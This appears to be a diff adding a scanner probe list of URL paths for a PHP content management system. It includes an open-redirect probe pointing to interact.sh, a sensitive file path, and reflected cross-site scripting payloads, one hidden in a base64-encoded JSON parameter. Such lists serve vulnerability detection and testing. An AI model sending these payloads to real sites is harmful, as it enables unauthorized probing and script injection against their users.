@@ -1,0 +1,5 @@
+/index.php?m=user&c=Users&a=logout&referurl=https://interact.sh
+/data/model/custom_model_path/recruit.filelist.txt
+
+/admin/twitter.php?active_t=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/login.php?a=get_upload_list&c=Uploadimgnew&info=eyJudW0iOiIxXCI%2BPFNjUmlQdCA%2BYWxlcnQoZG9jdW1lbnQuZG9tYWluKTwvU2NSaVB0PiIsInNpemUiOiIyMDk3MTUyIiwiaW5wdXQiOiIiLCJmdW5jIjoiaGVhZF9waWNfY2FsbF9iYWNrIiwicGF0aCI6ImFsbGltZyIsImlzX3dhdGVyIjoiMSIsImFsZyI6IkhTMjU2In0&lang=cn&m=admin&unneed_syn=
